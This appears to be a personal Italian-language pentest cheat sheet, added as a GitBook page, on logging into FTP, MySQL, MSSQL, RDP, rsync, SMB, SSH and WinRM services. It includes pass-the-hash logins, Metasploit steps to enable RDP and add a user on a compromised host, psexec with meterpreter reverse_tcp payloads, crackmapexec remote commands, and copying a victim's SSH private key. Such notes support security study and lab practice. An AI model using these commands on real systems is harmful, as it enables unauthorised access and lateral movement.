@@ -1,0 +1,292 @@
+---
+icon: right-to-bracket
+---
+
+# Login
+
+## <mark style="color:$primary;">FTP - 21</mark>
+
+{% tabs %}
+{% tab title="Login" %}
+```shell
+ftp <IP>                            #Se abilitato l'anon hai accesso a FTP
+    #Name: <NOME_TROVATO>
+    #Password: <PSW_TROVATA>
+```
+
+get, put file, cd /
+{% endtab %}
+
+{% tab title="Login - anonymous " %}
+```shell
+ftp <IP>                            #Se abilitato l'anon hai accesso a FTP
+    #Name: anonymous
+    #Password: ENTER
+```
+{% endtab %}
+{% endtabs %}
+
+***
+
+## <mark style="color:$primary;">MySQL - 3306</mark>
+
+{% tabs %}
+{% tab title="Login" %}
+```shellscript
+mysql -u <USER> -p<PSW_TROVATA> -h <IP> 
+```
+{% endtab %}
+
+{% tab title="Login - user senza psw" %}
+```shell
+mysql -u <USER> -h <IP> 
+```
+{% endtab %}
+
+{% tab title="Login - anonymous" %}
+```shell
+mysql -u "" -h <IP> 
+#OPPURE
+mysql -h <IP> 
+```
+{% endtab %}
+
+{% tab title="Login - Host locale" %}
+```shellscript
+mysql <TARGET_IP> -u <USER> -p
+```
+{% endtab %}
+{% endtabs %}
+
+***
+
+## <mark style="color:$primary;">MSSQL - 1433</mark>
+
+```shell
+sqsh -S <IP> -U <USER>
+```
+
+***
+
+## <mark style="color:$primary;">RDP - 3389</mark>
+
+{% tabs %}
+{% tab title="Login" %}
+```shellscript
+xfreerdp /u:<USER> /p:<PSW> /v:<IP>:<PORT_USATA>
+```
+{% endtab %}
+
+{% tab title="Login (NTLM)" %}
+```shell
+xfreerdp /u:<USER> /pth:<NTLM_HASH> /v:<IP>
+```
+
+!!!!!! WARNING !!!!!!
+
+Se usi NTLM potresti avere degli errori. Nel caso ricavati la psw in chiaro e prova con il login con password in chiaro.
+{% endtab %}
+
+{% tab title="Apri RDP" %}
+Se RDP è chiusa fai exploit e poi aprila
+
+{% code title="msf - Kali" %}
+```shellscript
+use post/windows/manage/enable_tcp
+    set SESSION 1
+    run
+```
+{% endcode %}
+
+Aggiungi l'user e la psw&#x20;
+
+```shell
+shell
+    net user <USER> <PSW_CHE_VUOI_TU>
+```
+
+Apri altro terminale
+
+```shell
+xfreerdp /u:<USER> /p:<PSW_HAI_SCELTO_PRIMA> /v:<IP_TARGET>:<PORT_USATA>
+```
+{% endtab %}
+{% endtabs %}
+
+***
+
+## <mark style="color:$primary;">RSYNC - 873</mark>
+
+Non c'è login effettivo
+
+```shell
+#Enum moduli disponibili
+rsync <IP>::
+
+rsync rsync://<IP>/<moduloApparsoPrima>/
+#OPPURE
+rsync <IP>::<moduloApparsoPrima>/
+
+#Scarica tutto (se permesso)
+rsync -av rsync://<IP>/<moduloApparsoPrima>/ ./
+```
+
+***
+
+## <mark style="color:$primary;">SMB / SAMBA - 445</mark>
+
+{% tabs %}
+{% tab title="Login" %}
+```shell
+smbclient -L //<IP> -U <USER>
+```
+
+Login a share specifica
+
+```shellscript
+smbclient \\\\<IP>\\<SHARE> -U <USER>                #SHARE a volte è USER 
+```
+
+get FILE.txt
+{% endtab %}
+
+{% tab title="Login con SHELL or (NTLM)" %}
+```shell
+cp /usr/share/doc/python3-impacket/examples/psexec.py /root/Desktop
+cd /root/Desktop
+chmod +x psexec.py
+python3 psexec.py <USER>@<IP>
+```
+
+oppure
+
+```shell
+use exploit/windows/smb/psexec
+    set RHOSTS <IP>
+    set SMBUser <USER>
+    set SMBPass <LM:NTLM>
+    set payload windows/meterpreter/reverse_tcp            #Windows x86 (Processo)
+    set payload windows/x64/meterpreter/reverse_tcp        #Windows x64 (Processo)
+    #set LHOST                                             #FORSE 
+    #set LPORT                                             #FORSE
+    run
+ #Avrai meterpreter
+ #SE ERRORE: exploit fatto ma no shell cambia il payload
+
+shell #Per usare la shell
+```
+{% endtab %}
+
+{% tab title="Enum SMB" %}
+Enum full
+
+```shell
+enum4linux -a -u <USER> -p <PSW> <IP>                    #Kali
+```
+
+Trova le share
+
+```shellscript
+smbmap -H <IP> -u <USER> -p <PSW>                        #Kali
+```
+{% endtab %}
+
+{% tab title="Enum (NTLM)" %}
+```shell
+crackmapexec smb <IP> -u <USER> -H "<LM:NTLM>"                    #Kali
+
+crackmapexec smb <IP> -u <USER> -H "<LM:NTLM>" --admin
+crackmapexec smb <IP> -u <USER> -H "<LM:NTLM>" --shares
+crackmapexec smb <IP> -u <USER> -H "<LM:NTLM>" --users
+crackmapexec smb <IP> -u <USER> -H "<LM:NTLM>" --groups
+
+crackmapexec smb <IP> -u <USER> -H "<LM:NTLM>" -x "<CMD>"         #CMD=ipconfig,whoami,net user, 
+```
+{% endtab %}
+
+{% tab title="Login - Anon" %}
+```shell
+smbclient -L //<IP>/ -N
+
+
+rpcclient -U "" <IP>
+#OPPURE
+smbclient //<IP>/<SHARE> -N
+```
+{% endtab %}
+{% endtabs %}
+
+Se ti serve una SHELL usa exploit/windows/smb/psexec.
+
+***
+
+## <mark style="color:$primary;">SNMB</mark>
+
+```shell
+#Login non presente
+#Usa nmap per scoprire gli users del sistema e poi attaccare altri servizi
+```
+
+***
+
+## <mark style="color:$primary;">SSH - 22</mark>
+
+{% tabs %}
+{% tab title="Login - psw" %}
+```shell
+ssh <USER>@<IP>
+```
+{% endtab %}
+
+{% tab title="Login - rsa_key" %}
+```shell
+ssh -i id_rsa <user>@<IP>
+```
+
+Per copiare id\_rsa      `scp <USER>@<IP>:~/.ssh/id_rsa .`
+{% endtab %}
+{% endtabs %}
+
+***
+
+## <mark style="color:$primary;">WinRM - 5985/5986</mark>
+
+{% tabs %}
+{% tab title="Login" %}
+```shell
+evil-winrm -i <IP> -u <USER> -p <PSW>
+```
+{% endtab %}
+
+{% tab title="Login (NTLM)" %}
+```shell
+evil-winrm -i <IP> -u <USER> -H <NTLM_HASH>
+```
+{% endtab %}
+{% endtabs %}
+
+***
+
+## <mark style="color:$primary;">Shell interattiva - PSExec</mark>
+
+```shell
+#Se hai le creds e ti serve una shell
+use exploit/windows/smb/psexec
+    set RHOSTS <IP>
+    set smbuser <USER>
+    set smbpass <PSW>
+    run
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
